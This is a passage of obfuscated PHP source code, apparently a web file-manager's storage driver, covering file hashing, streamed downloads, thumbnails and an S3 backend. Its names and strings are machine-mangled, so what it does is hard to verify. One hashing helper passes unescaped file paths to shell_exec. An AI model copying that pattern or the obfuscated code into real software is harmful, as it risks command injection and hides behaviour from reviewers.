$_SERVER[™¾ÇÙ¯¹]; if (!$¢ÚÅ£ÊÄ) { return md5($İâ¡Ü²¬[12]); } $¾‰¥„Ğ = $this->size($¢ÚÅ£ÊÄ); $Æéô¨çó = 200; $ÌŸ¼†× = 50; if ($¾‰¥„Ğ <= $Æéô¨çó * $ÌŸ¼†×) { return $this->hashMd5($¢ÚÅ£ÊÄ) . $¾‰¥„Ğ; } $úÙ¯Â£Ú = intval($¾‰¥„Ğ / $ÌŸ¼†×); $¸ºÊŸ”Ç = $İâ¡Ü²¬[12]; for ($Ùá›êß€ = 0; $Ùá›êß€ < $ÌŸ¼†×; $Ùá›êß€++) { $¸ºÊŸ”Ç .= $this->fileSubstr($¢ÚÅ£ÊÄ, $úÙ¯Â£Ú * $Ùá›êß€, $Æéô¨çó); } $¸ºÊŸ”Ç .= $this->fileSubstr($¢ÚÅ£ÊÄ, $¾‰¥„Ğ - $Æéô¨çó, $Æéô¨çó); return md5($¸ºÊŸ”Ç) . $¾‰¥„Ğ; } public static $md5Cache = array(); public function hashMd5($Ë•Ù¹âÙ) { if (!$Ë•Ù¹âÙ) { return md5($_SERVER[™¾ÇÙ¯¹][12]); } $Ë•Ù¹âÙ = $this->iconvSystem($Ë•Ù¹âÙ); if (isset(self::$md5Cache[$Ë•Ù¹âÙ])) { return self::$md5Cache[$Ë•Ù¹âÙ]; } self::$md5Cache[$Ë•Ù¹âÙ] = $this->hashMd5Shell($Ë•Ù¹âÙ); if (!self::$md5Cache[$Ë•Ù¹âÙ]) { self::$md5Cache[$Ë•Ù¹âÙ] = @md5_file($Ë•Ù¹âÙ); } return self::$md5Cache[$Ë•Ù¹âÙ]; } private function hashMd5Shell($äÉÊ³ĞÏ) { $Úù¦ğ´ì =& $_SERVER[™¾ÇÙ¯¹]; if (!$äÉÊ³ĞÏ) { return md5($Úù¦ğ´ì[12]); } if (!function_exists($Úù¦ğ´ì[98])) { return !1; } $  Ğ—•ï = array($Úù¦ğ´ì[99], $Úù¦ğ´ì[100]); $úÄÜÀø = Cache::get($Úù¦ğ´ì[101]); if (!$úÄÜÀø) { $İ‡ÇŠšä = BASIC_PATH . $Úù¦ğ´ì[102]; $™Ç´ßñª = md5_file($İ‡ÇŠšä); $úÄÜÀø = $Úù¦ğ´ì[103]; foreach ($  Ğ—•ï as $´»·ê´ù) { $¦ÄÍé¸ƒ = shell_exec($´»·ê´ù . "\40\x22{$İ‡ÇŠšä}\42"); if ($¦ÄÍé¸ƒ && substr(trim($¦ÄÍé¸ƒ), 0, 32) == $™Ç´ßñª) { $úÄÜÀø = $´»·ê´ù; break; } } Cache::set($Úù¦ğ´ì[101], $úÄÜÀø, 3600); } if ($úÄÜÀø == $Úù¦ğ´ì[103]) { return !1; } $¦ÄÍé¸ƒ = shell_exec($úÄÜÀø . "\x20\42{$äÉÊ³ĞÏ}\x22"); $¦ÄÍé¸ƒ = str_replace($Úù¦ğ´ì[104], $Úù¦ğ´ì[12], $¦ÄÍé¸ƒ); return substr($¦ÄÍé¸ƒ, 0, 32); } public function link($‹†‘™Ğ) { return $‹†‘™Ğ; } public function fileOut($è”“´ÏĞ, $ËéæÚÛä = false, $êÚà¸Ü¸ = false, $¡¥µ†û = '') { $àÄÓ´áÃ =& $_SERVER[™¾ÇÙ¯¹]; $this->cacheMethod(null, null); if (!$è”“´ÏĞ || !$this->exist($è”“´ÏĞ)) { show_json(LNG($àÄÓ´áÃ[105]), !1, $êÚà¸Ü¸); } $Ã¯²¤çÖ = $this->getType() == $àÄÓ´áÃ[106]; $ÂŠŒğ¾ç = $GLOBALS[$àÄÓ´áÃ[6]][$àÄÓ´áÃ[89]][$àÄÓ´áÃ[107]][$àÄÓ´áÃ[108]]; $’ ¢ÄØè = (double) $GLOBALS[$àÄÓ´áÃ[6]][$àÄÓ´áÃ[89]][$àÄÓ´áÃ[107]][$àÄÓ´áÃ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $Ó³…¹Á‘ = $this->infoFull($è”“´ÏĞ); $æÉŞò™Æ = $Ó³…¹Á‘[$àÄÓ´áÃ[76]]; $’£Õ—Õš = gmdate($àÄÓ´áÃ[110], $Ó³…¹Á‘[$àÄÓ´áÃ[85]]); $·¥­¾Çğ = $êÚà¸Ü¸ ? $êÚà¸Ü¸ : $this->iconvApp($Ó³…¹Á‘[$àÄÓ´áÃ[32]]); $ú•’ŒÇ“ = 0; $°óØúëª = $æÉŞò™Æ - 1; $Ú¯Şñ‚– = $this->ext($·¥­¾Çğ); if (in_array($Ú¯Şñ‚–, array($àÄÓ´áÃ[111], $àÄÓ´áÃ[112], $àÄÓ´áÃ[113], $àÄÓ´áÃ[114]))) { $Ú¯Şñ‚– = $àÄÓ´áÃ[115]; } if (in_array($Ú¯Şñ‚–, array($àÄÓ´áÃ[116]))) { $Ú¯Şñ‚– = $àÄÓ´áÃ[117]; } if (!$¡¥µ†û) { $¡¥µ†û = md5($’£Õ—Õš . $this->hashSimple($è”“´ÏĞ)); } $¡¥µ†û = $àÄÓ´áÃ[118] . $¡¥µ†û . $àÄÓ´áÃ[118]; $Ô¼äÃâØ = get_file_mime($Ú¯Şñ‚–); $Œ¬‹Ïâ± = !0; $Œ¬‹Ïâ± = isset($_GET[$àÄÓ´áÃ[119]]) ? !1 : !0; if ($ËéæÚÛä === !1 && !mime_support($Ô¼äÃâØ)) { $Ô¼äÃâØ = $àÄÓ´áÃ[120]; } header($àÄÓ´áÃ[121]); header($àÄÓ´áÃ[122] . $Ô¼äÃâØ); $Éˆù¡Âß = rawurlencode($·¥­¾Çğ); $Éˆù¡Âß = $àÄÓ´áÃ[118] . $Éˆù¡Âß . $àÄÓ´áÃ[123] . $Éˆù¡Âß; if ($ËéæÚÛä) { header($àÄÓ´áÃ[124]); header($àÄÓ´áÃ[125] . $Éˆù¡Âß); } else { if ($Œ¬‹Ïâ±) { header($àÄÓ´áÃ[126] . $Éˆù¡Âß); } } header($àÄÓ´áÃ[127] . gmdate($àÄÓ´áÃ[110], time() + 3600 * 24 * 30) . $àÄÓ´áÃ[128]); header($àÄÓ´áÃ[129]); header($àÄÓ´áÃ[130]); header($àÄÓ´áÃ[131]); if (isset($_SERVER[$àÄÓ´áÃ[132]]) && strtotime($_SERVER[$àÄÓ´áÃ[132]]) == $Ó³…¹Á‘[$àÄÓ´áÃ[85]]) { header($àÄÓ´áÃ[133], !0, 304); die; } if (isset($_SERVER[$àÄÓ´áÃ[134]]) && $_SERVER[$àÄÓ´áÃ[134]] == $¡¥µ†û) { header($àÄÓ´áÃ[135] . $¡¥µ†û, !0, 304); die; } header($àÄÓ´áÃ[135] . $¡¥µ†û); header($àÄÓ´áÃ[136] . $’£Õ—Õš . $àÄÓ´áÃ[128]); header($àÄÓ´áÃ[137] . $·¥­¾Çğ); header($àÄÓ´áÃ[138]); header($àÄÓ´áÃ[139] . $æÉŞò™Æ); header($àÄÓ´áÃ[140]); if (!$ËéæÚÛä && $Ú¯Şñ‚– == $àÄÓ´áÃ[141]) { if ($æÉŞò™Æ > 1024 * 1024 * 5) { die; } $·°Ö€À­ = $this->getContent($è”“´ÏĞ); $·°Ö€À­ = Html::clearSVG($·°Ö€À­); header($àÄÓ´áÃ[142] . strlen($·°Ö€À­)); echo $·°Ö€À­; die; } $„µõÙğó = strtolower($_SERVER[$àÄÓ´áÃ[143]]); if ($Ã¯²¤çÖ && $„µõÙğó && $ÂŠŒğ¾ç) { if (strstr($„µõÙğó, $àÄÓ´áÃ[144])) { header($àÄÓ´áÃ[145] . $è”“´ÏĞ); } else { if (strstr($„µõÙğó, $àÄÓ´áÃ[146])) { header($àÄÓ´áÃ[147] . $è”“´ÏĞ); } else { if (strstr($„µõÙğó, $àÄÓ´áÃ[148])) { header($àÄÓ´áÃ[149] . $è”“´ÏĞ); } } } if ($’ ¢ÄØè) { header($àÄÓ´áÃ[150] . $’ ¢ÄØè); } return; } if (isset($_SERVER[$àÄÓ´áÃ[151]])) { if (preg_match($àÄÓ´áÃ[152], $_SERVER[$àÄÓ´áÃ[151]], $±çİÊäŞ)) { $ú•’ŒÇ“ = intval($±çİÊäŞ[1]); if (!empty($±çİÊäŞ[2])) { $°óØúëª = intval($±çİÊäŞ[2]); } } header($àÄÓ´áÃ[153]); header("\x43\157\x6e\x74\145\x6e\164\55\122\141\x6e\x67\145\72\x20\142\171\x74\145\163\40{$ú•’ŒÇ“}\55{$°óØúëª}\57" . $æÉŞò™Æ); } else { header($àÄÓ´áÃ[154]); } header($àÄÓ´áÃ[155]); $óÒæÆò÷ = !0; if ($_SERVER[$àÄÓ´áÃ[156]] == $àÄÓ´áÃ[157] && $æÉŞò™Æ > 1204 * 1024 * 1024 * 2) { $óÒæÆò÷ = !1; } if ($óÒæÆò÷) { header($àÄÓ´áÃ[158] . ($°óØúëª - $ú•’ŒÇ“ + 1)); } if ($_SERVER[$àÄÓ´áÃ[159]] == $àÄÓ´áÃ[160]) { return; } $ÌñÔ˜œ = 1024 * 100; $ˆÅ¼²€· = 0; if ($’ ¢ÄØè) { $ˆÅ¼²€· = intval(1000 * 1000 * ($ÌñÔ˜œ / $’ ¢ÄØè)); } while ($ú•’ŒÇ“ <= $°óØúëª) { $Áî—‹¡Ë = timeFloat(); check_abort(); $øâ’‡Á• = $°óØúëª - $ú•’ŒÇ“ + 1; if ($øâ’‡Á• <= $ÌñÔ˜œ) { $ÌñÔ˜œ = $øâ’‡Á•; } echo $this->fileSubstr($è”“´ÏĞ, $ú•’ŒÇ“, $ÌñÔ˜œ); $ú•’ŒÇ“ += $ÌñÔ˜œ; if ($ÌñÔ˜œ == $øâ’‡Á•) { $ú•’ŒÇ“ = $°óØúëª + 1; } if ($ˆÅ¼²€·) { $ÚÎÌäÜÔ = intval(1000 * 1000 * (timeFloat() - $Áî—‹¡Ë)); $äô¢ˆ‚ = $ˆÅ¼²€· - $ÚÎÌäÜÔ; if ($äô¢ˆ‚ > 5) { usleep($äô¢ˆ‚); } } } } public function fileOutServer($ª¯à”, $Š§¬Ï¥ = false, $¬“ë ó  = false, $¶¬µ´Óô = '') { $this->fileOut($ª¯à”, $Š§¬Ï¥, $¬“ë ó , $¶¬µ´Óô); } public function fileOutLink($Ø¨À¢Şİ) { header($_SERVER[™¾ÇÙ¯¹][161] . $Ø¨À¢Şİ); die; } public function cacheMethod($ÆèÀ˜Çš, $¡¸ôáò, $ä”â²é = null) { $ÁË×¶¹ =& $_SERVER[™¾ÇÙ¯¹]; static $’ğóÄ¶Ö = array(); $çıŸšº = $¡¸ôáò ? ltrim($this->getPathOuter($¡¸ôáò), $ÁË×¶¹[8]) : $ÁË×¶¹[12]; $ï¶Ğä¨Í = $ÁË×¶¹[162] . $ÆèÀ˜Çš . $ÁË×¶¹[163] . rtrim($çıŸšº, $ÁË×¶¹[8]); if (is_null($ÆèÀ˜Çš)) { $’ğóÄ¶Ö = array(); return; } if (is_null($¡¸ôáò)) { foreach ($’ğóÄ¶Ö as $ï¶Ğä¨Í => $Èú¡•âÍ) { if (!strstr($ï¶Ğä¨Í, $ÁË×¶¹[162] . $ÆèÀ˜Çš . $ÁË×¶¹[164])) { continue; } unset($’ğóÄ¶Ö[$ï¶Ğä¨Í]); } return; } if (!is_null($ä”â²é)) { $’ğóÄ¶Ö[$ï¶Ğä¨Í] = $ä”â²é; return; } $¯±îÔà = isset($’ğóÄ¶Ö[$ï¶Ğä¨Í]) ? $’ğóÄ¶Ö[$ï¶Ğä¨Í] : null; if (!is_null($¯±îÔà)) { return $¯±îÔà; } $¯±îÔà = $this->{$ÆèÀ˜Çš}($¡¸ôáò); $’ğóÄ¶Ö[$ï¶Ğä¨Í] = $¯±îÔà; return $¯±îÔà; } public function cacheMethodInfoSet($Àó‚ëÈª, $†éáøŸ˜, $Ÿ“¤Ìœğ = false) { $ĞÅ‡ğñ˜ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ĞÅ‡ğñ˜[165], $Àó‚ëÈª, $†éáøŸ˜); $this->cacheMethod($ĞÅ‡ğñ˜[166], $Àó‚ëÈª, $†éáøŸ˜ ? !1 : !0); if (is_array($Ÿ“¤Ìœğ)) { $this->cacheMethod($ĞÅ‡ğñ˜[167], $Àó‚ëÈª, $Ÿ“¤Ìœğ); } } public function fileOutImage($•’¦ááü, $µıô½é = 250) { $šß…Àíª =& $_SERVER[™¾ÇÙ¯¹]; set_timeout(); if (substr($•’¦ááü, 0, 4) == $šß…Àíª[148]) { $this->fileOutLink($•’¦ááü); } $ «­­ô£ = $this->info($•’¦ááü); $Ö¬£¬— = $ «­­ô£[$šß…Àíª[32]]; $Å÷È÷¯Ô = !1; if (isset($GLOBALS[$šß…Àíª[168]]) && $GLOBALS[$šß…Àíª[168]][$šß…Àíª[84]] == $ «­­ô£[$šß…Àíª[84]]) { $à“ÊËà = $GLOBALS[$šß…Àíª[168]][$šß…Àíª[169]]; if (!$ «­­ô£[$šß…Àíª[170]]) { $ «­­ô£[$šß…Àíª[170]] = $GLOBALS[$šß…Àíª[168]]; } if (isset($à“ÊËà[$šß…Àíª[171]])) { if ($à“ÊËà[$šß…Àíª[171]] <= $µıô½é && $à“ÊËà[$šß…Àíª[172]] <= $µıô½é) { $Å÷È÷¯Ô = !0; } } $Ö¬£¬— = $ «­­ô£[$šß…Àíª[170]][$šß…Àíª[32]]; } if ($ «­­ô£[$šß…Àíª[76]] <= 1024 * 50 || $Å÷È÷¯Ô || !function_exists($šß…Àíª[173]) || $ «­­ô£[$šß…Àíª[174]] == $šß…Àíª[175]) { return $this->fileOut($•’¦ááü, !1, $Ö¬£¬—); } if (isset($ «­­ô£[$šß…Àíª[170]][$šß…Àíª[176]])) { $Ş®´Æ‹´ = $ «­­ô£[$šß…Àíª[170]][$šß…Àíª[176]]; } else { if (isset($ «­­ô£[$šß…Àíª[170]][$šß…Àíª[177]])) { $Ş®´Æ‹´ = $ «­­ô£[$šß…Àíª[170]][$šß…Àíª[177]]; } } if (!$Ş®´Æ‹´) { $Ş®´Æ‹´ = md5("{$ «­­ô£[$šß…Àíª[32]]}\x5f{$ «­­ô£[$šß…Àíª[84]]}\137{$ «­­ô£[$šß…Àíª[76]]}\x5f{$µıô½é}"); } $´»„ş–¿ = "{$Ş®´Æ‹´}\137{$µıô½é}\x2e\x70\x6e\147"; if (!($ÏÀîÊ’ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $šß…Àíª[178]))) { $•’Íü = IO::mkdir(IO_PATH_SYSTEM_TEMP . $šß…Àíª[179]); } else { $•’Íü = KodIO::make($ÏÀîÊ’); } if ($ÏÀîÊ’ = IO::fileNameExist($•’Íü, $´»„ş–¿)) { $¯ŠÅĞõŸ = KodIO::make($ÏÀîÊ’); return IO::fileOut($¯ŠÅĞõŸ, !1, $Ö¬£¬—); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $¯ŠÅĞõŸ = DATA_THUMB . $´»„ş–¿; del_file($¯ŠÅĞõŸ); if (!@file_exists($¯ŠÅĞõŸ)) { $øç¬¸ñ¤ = TEMP_FILES; if (!is_dir($øç¬¸ñ¤)) { mk_dir($øç¬¸ñ¤); } $Œ¯î ”É = $øç¬¸ñ¤ . $Ş®´Æ‹´ . $šß…Àíª[10] . $ «­­ô£[$šß…Àíª[174]]; if (!@file_exists($Œ¯î ”É)) { $Œ¯î ”É = $this->download($•’¦ááü, $Œ¯î ”É); } ImageThumb::createThumb($Œ¯î ”É, $¯ŠÅĞõŸ, $µıô½é, $µıô½é * 10); } if (!file_exists($¯ŠÅĞõŸ) || filesize($¯ŠÅĞõŸ) < 100) { return @file_exists($Œ¯î ”É) ? IO::fileOut($Œ¯î ”É) : $this->fileOut($•’¦ááü); } if (!($ÍóÖñ“ = IO::move($¯ŠÅĞõŸ, $•’Íü))) { return IO::fileOut($¯ŠÅĞõŸ); } del_file($¯ŠÅĞõŸ); IO::fileOut($ÍóÖñ“); } public function fileOutImageServer($»¦‹ö¦, $Á°ô¼¬‰ = 250) { $this->fileOutImage($»¦‹ö¦, $Á°ô¼¬‰); } public function fileNameAuto($¹Í¨˜ , $öš¬–Ï, $Îˆ¨ò‚¡ = REPEAT_RENAME, $¼ÁÀÏşñ = false) { $ŸÖ«±ÔÆ =& $_SERVER[™¾ÇÙ¯¹]; $‚¾ëËÑş = $¹Í¨˜  === $ŸÖ«±ÔÆ[12] ? $öš¬–Ï : rtrim($¹Í¨˜ , $ŸÖ«±ÔÆ[8]) . $ŸÖ«±ÔÆ[8] . $öš¬–Ï; if ($Îˆ¨ò‚¡ == REPEAT_REPLACE || !$this->exist($‚¾ëËÑş) || $¼ÁÀÏşñ && $Îˆ¨ò‚¡ != REPEAT_RENAME_FOLDER) { return $öš¬–Ï; } if ($Îˆ¨ò‚¡ == REPEAT_SKIP) { return !1; } $ªä ¦„ = $ŸÖ«±ÔÆ[10] . get_path_ext($öš¬–Ï); $ªä ¦„ = $ªä ¦„ == $ŸÖ«±ÔÆ[10] || $¼ÁÀÏşñ ? $ŸÖ«±ÔÆ[12] : $ªä ¦„; $šÉ×ŸõÅ = 1; $ò°¤ÙØ• = substr($öš¬–Ï, 0, strlen($öš¬–Ï) - strlen($ªä ¦„)); $È¤ß±ªü = $ò°¤ÙØ• . "\x28{$šÉ×ŸõÅ}\51{$ªä ¦„}"; while ($this->exist(rtrim($¹Í¨˜ , $ŸÖ«±ÔÆ[8]) . $ŸÖ«±ÔÆ[8] . $È¤ß±ªü)) { $È¤ß±ªü = $ò°¤ÙØ• . "\x28{$šÉ×ŸõÅ}\x29{$ªä ¦„}"; $šÉ×ŸõÅ++; } return $È¤ß±ªü; } private function fileNameAutoList($šéùªÛÅ, $¶Ñáë, $áÒÑà¢” = false) { $Ûí­÷œ =& $_SERVER[™¾ÇÙ¯¹]; $¼«ŞÖÈ« = $this->listPath($šéùªÛÅ, !0); $¼«ŞÖÈ« = array_merge($¼«ŞÖÈ«[$Ûí­÷œ[82]], $¼«ŞÖÈ«[$Ûí­÷œ[83]]); $ĞŞÙø÷é = array_to_keyvalue($¼«ŞÖÈ«, $Ûí­÷œ[12], $Ûí­÷œ[32]); $õ¬ûÁŞõ = $Ûí­÷œ[10] . get_path_ext($¶Ñáë); $õ¬ûÁŞõ = $õ¬ûÁŞõ == $Ûí­÷œ[10] || $áÒÑà¢” ? $Ûí­÷œ[12] : $õ¬ûÁŞõ; $É¡¦‰Õ‹ = substr($¶Ñáë, 0, strlen($¶Ñáë) - strlen($õ¬ûÁŞõ)); $¶ı¨ÁËé = $É¡¦‰Õ‹ . "\x28\x30\51{$õ¬ûÁŞõ}"; for ($Ùô¥àğÒ = 1; $Ùô¥àğÒ <= count($ĞŞÙø÷é) + 1; $Ùô¥àğÒ++) { $¶ı¨ÁËé = $É¡¦‰Õ‹ . "\x28{$Ùô¥àğÒ}\51{$õ¬ûÁŞõ}"; if (!in_array_not_case($¶ı¨ÁËé, $ĞŞÙø÷é)) { return $¶ı¨ÁËé; } } return $¶ı¨ÁËé; } public function listAllFiles($³éƒ›‹Æ, $ÜŒ¨‡Û•, $°§ÛÀ‚± = array()) { $Å¶ŒŒÌµ =& $_SERVER[™¾ÇÙ¯¹]; if (empty($ÜŒ¨‡Û•)) { return array(); } $Æ¿˜îÎİ = array(); $³éƒ›‹Æ = trim($³éƒ›‹Æ, $Å¶ŒŒÌµ[8]); foreach ($ÜŒ¨‡Û• as $‰úÔ»·) { $Ò´§­± = ltrim(substr(trim($‰úÔ»·, $Å¶ŒŒÌµ[8]), strlen($³éƒ›‹Æ)), $Å¶ŒŒÌµ[8]); $Æ¿˜îÎİ = array_merge($Æ¿˜îÎİ, $this->slicePath($Ò´§­±)); } $ïğ‘ó›ş = array(); foreach (array_unique($Æ¿˜îÎİ) as $‰úÔ»·) { $´Ã©üÖö = array($Å¶ŒŒÌµ[84] => $this->getPathOuter($Å¶ŒŒÌµ[8] . $³éƒ›‹Æ . $Å¶ŒŒÌµ[8] . $‰úÔ»·), $Å¶ŒŒÌµ[75] => 1, $Å¶ŒŒÌµ[76] => 0); if (substr($‰úÔ»·, -1) != $Å¶ŒŒÌµ[8]) { $´Ã©üÖö[$Å¶ŒŒÌµ[75]] = 0; $½õò×÷³ = $this->getPath($³éƒ›‹Æ . $Å¶ŒŒÌµ[8] . $‰úÔ»·); $´Ã©üÖö[$Å¶ŒŒÌµ[76]] = isset($°§ÛÀ‚±[$½õò×÷³]) ? $°§ÛÀ‚±[$½õò×÷³] : $this->size($½õò×÷³); } $ïğ‘ó›ş[] = $´Ã©üÖö; } return $ïğ‘ó›ş; } public function slicePath($–˜‹êæ) { $Ü·˜µ =& $_SERVER[™¾ÇÙ¯¹]; $Ã şÔ½ì = explode($Ü·˜µ[8], trim($–˜‹êæ, $Ü·˜µ[8])); $£ã±™‡Š = 0; do { ++$£ã±™‡Š; $šŞÏığÊ[] = implode($Ü·˜µ[8], array_slice($Ã şÔ½ì, 0, $£ã±™‡Š)) . $Ü·˜µ[8]; } while ($£ã±™‡Š < count($Ã şÔ½ì)); $šŞÏığÊ[count($Ã şÔ½ì) - 1] = $–˜‹êæ; return $šŞÏığÊ; } public function getHost() { $ƒª¥¢¬Ÿ =& $_SERVER[™¾ÇÙ¯¹]; $Â¤²èÃ’ = parse_url(trim($this->domain, $ƒª¥¢¬Ÿ[8])); $Ìåúè¯ = isset($Â¤²èÃ’[$ƒª¥¢¬Ÿ[180]]) ? $Â¤²èÃ’[$ƒª¥¢¬Ÿ[180]] : http_type(); $¼ô÷ñ£ı = isset($Â¤²èÃ’[$ƒª¥¢¬Ÿ[181]]) ? $Â¤²èÃ’[$ƒª¥¢¬Ÿ[181]] : $Â¤²èÃ’[$ƒª¥¢¬Ÿ[84]]; if (isset($Â¤²èÃ’[$ƒª¥¢¬Ÿ[182]])) { $¼ô÷ñ£ı .= $ƒª¥¢¬Ÿ[4] . $Â¤²èÃ’[$ƒª¥¢¬Ÿ[182]]; } return $Ìåúè¯ . $ƒª¥¢¬Ÿ[183] . $¼ô÷ñ£ı; } public function pathEncode($ë›™ÙŠ§) { $…·· œí =& $_SERVER[™¾ÇÙ¯¹]; return str_replace($…·· œí[184], $…·· œí[8], rawurlencode($ë›™ÙŠ§)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($ƒéÃÙÚ­) { set_timeout(); require_once SDK_DIR . $_SERVER[™¾ÇÙ¯¹][185]; parent::__construct(); $this->_init($ƒéÃÙÚ­); } public function _init($îÚ…÷ÃÕ) { foreach ($îÚ…÷ÃÕ as $ÙÚ•¶£± => $æ‚ıäö¬) { if (isset($this->{$ÙÚ•¶£±})) { $this->{$ÙÚ•¶£±} = $æ‚ıäö¬; } } $this->endpoint = $îÚ…÷ÃÕ[$_SERVER[™¾ÇÙ¯¹][186]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Ú¼¸¼Ø = "\166\64") { $this->signVer = $Ú¼¸¼Ø; $this->client->setSignatureVersion($Ú¼¸¼Ø); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $€È–‰øì =& $_SERVER[™¾ÇÙ¯¹]; $¿éœ¹ƒ = $this->getBucketCors(); if (!$¿éœ¹ƒ || !is_array($¿éœ¹ƒ)) { return !1; } if ($¿éœ¹ƒ[$€È–‰øì[187]] != $€È–‰øì[188] || $¿éœ¹ƒ[$€È–‰øì[189]] != $€È–‰øì[188]) { return !1; } $ûÜ¹å¼Ÿ = array_map($€È–‰øì[190], $¿éœ¹ƒ[$€È–‰øì[191]]); if (!is_array($ûÜ¹å¼Ÿ)) { $ûÜ¹å¼Ÿ = array(); } $”Š®²‚Õ = array($€È–‰øì[192], $€È–‰øì[193], $€È–‰øì[194], $€È–‰øì[195], $€È–‰øì[196]); $í§Ã²– = array_diff($”Š®²‚Õ, $ûÜ¹å¼Ÿ); return empty($í§Ã²–); } public function mkfile($áìë Û, $‹„¯òµ = '', $Ü€òşÑª = REPEAT_RENAME) { $‘”Áˆ«ß = $this->setContent($áìë Û, $‹„¯òµ); if ($‘”Áˆ«ß !== !1) { return $this->getPathOuter($áìë Û); } return !1; } public function mkdir($úÎ‹ÍôŒ, $·†ì™« = REPEAT_SKIP) { $ßªÒŞä =& $_SERVER[™¾ÇÙ¯¹]; if (empty($úÎ‹ÍôŒ) && $úÎ‹ÍôŒ !== $ßªÒŞä[197]) { return !1; } if ($·†ì™« && $this->_isFolder($úÎ‹ÍôŒ)) { return $this->getPathOuter($úÎ‹ÍôŒ); } $å¬Èß½” = $this->setContent($úÎ‹ÍôŒ, $ßªÒŞä[12], !0); if ($å¬Èß½” !== !1) { return $this->getPathOuter($úÎ‹ÍôŒ); } return !1; } public function copyFile($üúÍ´Àµ, $—ÎËÎ¼Ÿ, $æê®ˆû = array()) { $ø¸·Ç =& $_SERVER[™¾ÇÙ¯¹]; $ê¥÷ò’§ = $this->objectMeta($üúÍ´Àµ); if (!$ê¥÷ò’§) { return !1; } if ($ê¥÷ò’§[$ø¸·Ç[76]] <= 1024 * 1024 * 200) { $í±£ìÛ’ = $this->client->copyObject($this->bucket, $üúÍ´Àµ, $this->bucket, $—ÎËÎ¼Ÿ, $ø¸·Ç[198], $æê®ˆû); } else { $í±£ìÛ’ = $this->client->multiCopyObject($this->bucket, $üúÍ´Àµ, $this->bucket, $—ÎËÎ¼Ÿ, $æê®ˆû); } $í±£ìÛ’ = $í±£ìÛ’ ? $this->getPathOuter($—ÎËÎ¼Ÿ) : !1; return $í±£ìÛ’; } public function moveFile($ñîŠÆîÏ, $î¯öçÅÃ) { if ($this->copyFile($ñîŠÆîÏ, $î¯öçÅÃ)) { $this->delFile($ñîŠÆîÏ); return $this->getPathOuter($î¯öçÅÃ); } return !1; } public function delFile($‡ÀĞÌ) { return $this->client->deleteObject($this->bucket, $‡ÀĞÌ); } public function delFolder($ÌšÑÔ½) { $Øû¼õ»¿ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->exist($ÌšÑÔ½)) { return !0; } $this->listItemCache = !1; $®‡‹° = $this->fileList($ÌšÑÔ½); $this->listItemCache = !0; $˜¾òª = trim($ÌšÑÔ½, $Øû¼õ»¿[8]) . $Øû¼õ»¿[8]; if (!empty($ÌšÑÔ½) && $ÌšÑÔ½ !== $Øû¼õ»¿[197] && !in_array($˜¾òª, $®‡‹°[$Øû¼õ»¿[82]])) { $®‡‹°[$Øû¼õ»¿[82]][] = $˜¾òª; } $–‡Èú»Ã = $this->delByBatch($®‡‹°[$Øû¼õ»¿[83]]); if (!$–‡Èú»Ã) { return !1; } $–‡Èú»Ã = $this->delByBatch($®‡‹°[$Øû¼õ»¿[82]]); if (!$–‡Èú»Ã) { return !1; } return $this->delFile($˜¾òª); } private function delByBatch($¾•±ÙÓñ) { foreach (array_chunk($¾•±ÙÓñ, 1000) as $Ç®¤÷Ê) { $§Ğ’Ì·Ù = $this->client->deleteObjects($this->bucket, $Ç®¤÷Ê); if (!$§Ğ’Ì·Ù) { return !1; } } return !0; } public function rename($î¿õ·©‡, $œØ‹­“Œ) { return $this->renameObject($î¿õ·©‡, $œØ‹­“Œ); } public function listPath($š›œÂíß, $–ÇÍÊ’„ = false) { $‚‚êÂ¥¡ =& $_SERVER[™¾ÇÙ¯¹]; $†¸‚«ÍŞ = $this->fileList($š›œÂíß, $‚‚êÂ¥¡[8], !0); foreach ($†¸‚«ÍŞ[$‚‚êÂ¥¡[82]] as $€Ç¸»»å => $´”ÊûÛÆ) { $†¸‚«ÍŞ[$‚‚êÂ¥¡[82]][$€Ç¸»»å] = $this->folderInfo($´”ÊûÛÆ, $–ÇÍÊ’„, $´”ÊûÛÆ); } foreach ($†¸‚«ÍŞ[$‚‚êÂ¥¡[83]] as $€Ç¸»»å => $´”ÊûÛÆ) { $†¸‚«ÍŞ[$‚‚êÂ¥¡[83]][$€Ç¸»»å] = $this->fileInfo($´”ÊûÛÆ[$‚‚êÂ¥¡[32]], $–ÇÍÊ’„, $´”ÊûÛÆ); } return $†¸‚«ÍŞ; } protected function infoChildren($²ÔÏ˜È‘, &$òÚ”úÕ) { $ºçĞÓ =& $_SERVER[™¾ÇÙ¯¹]; $¸ˆòœµÈ = $this->fileList($²ÔÏ˜È‘, $ºçĞÓ[12], !0); $òÚ”úÕ[$ºçĞÓ[78]] += count($¸ˆòœµÈ[$ºçĞÓ[82]]); $òÚ”úÕ[$ºçĞÓ[77]] += count($¸ˆòœµÈ[$ºçĞÓ[83]]); foreach ($¸ˆòœµÈ[$ºçĞÓ[83]] as $›Ë•Òì) { if (!$›Ë•Òì || !$›Ë•Òì[$ºçĞÓ[76]]) { continue; } $òÚ”úÕ[$ºçĞÓ[76]] += $›Ë•Òì[$ºçĞÓ[76]]; } } private function fileInfo($å¥Í©Ûü, $¦ÔÑÎå = false, $ìĞ¿Âë“ = array()) { $ÇèÛıºˆ =& $_SERVER[™¾ÇÙ¯¹]; $¹èºˆ‘î = array($ÇèÛıºˆ[32] => $this->pathThis($å¥Í©Ûü), $ÇèÛıºˆ[84] => $this->getPathOuter($å¥Í©Ûü), $ÇèÛıºˆ[33] => $ÇèÛıºˆ[199], $ÇèÛıºˆ[174] => $this->ext($å¥Í©Ûü), $ÇèÛıºˆ[76] => isset($ìĞ¿Âë“[$ÇèÛıºˆ[76]]) ? $ìĞ¿Âë“[$ÇèÛıºˆ[76]] : 0); if 